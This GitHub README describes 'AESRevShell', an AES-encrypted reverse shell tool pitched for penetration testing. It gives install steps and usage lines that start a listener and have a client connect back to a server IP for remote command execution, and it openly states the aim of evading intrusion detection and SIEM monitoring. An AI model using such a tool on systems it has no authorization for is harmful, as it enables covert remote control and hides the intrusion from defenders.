# AESRevShell
AESRevShell is a secure reverse shell tool that utilizes AES encryption (CBC mode) to ensure encrypted communication between a client and a server. This project demonstrates a simple yet powerful way to establish a secure command execution environment, where commands issued by the server are securely transmitted to the client and executed, with responses being sent back in an encrypted format.

By encrypting the communication with AES, this tool is designed to bypass traditional security systems such as **Intrusion Detection Systems (IDS), Intrusion Prevention Systems (IPS), and Security Information and Event Management (SIEM)** systems, making it a useful tool for penetration testing in environments with strict monitoring.

### Key features:
- **AES encryption (CBC mode)** for secure data transmission.
- **Client-server architecture** for reverse shell functionality.
- **Key and IV validation** to ensure both parties use the correct encryption parameters.
- **Command execution:** The server sends commands to the client, which are executed and returned securely.
- **Bypass of IDS/IPS/SIEM:** AES encryption hides the command and control traffic, making it difficult to detect by network monitoring systems.

This project is intended for educational purposes and to demonstrate how AES encryption can be used in real-time communication for security testing and penetration testing scenarios.

## Demos
![image](https://github.com/user-attachments/assets/fa632162-df75-4409-9db0-ddffb113dbb4)
![image](https://github.com/user-attachments/assets/afabc598-1cd5-4205-89aa-f32b6a2a5361)

## Installation
- `sudo apt update && sudo apt install -y python3-pip`
- `python3 -m pip install --upgrade cryptography`
- `git clone https://github.com/OusCyb3rH4ck/AESRevShell`
- `cd AESRevShell`
- `chmod +x client.py server.py`

## Usage (for server)
- `./server.py -i 0.0.0.0 -p 443` ***(put any port you want)***

## Usage (for client)
- `./client -s SERVER_IP -p PORT -k AES_KEY -v AES_IV` ***(all proportioned by the server)***
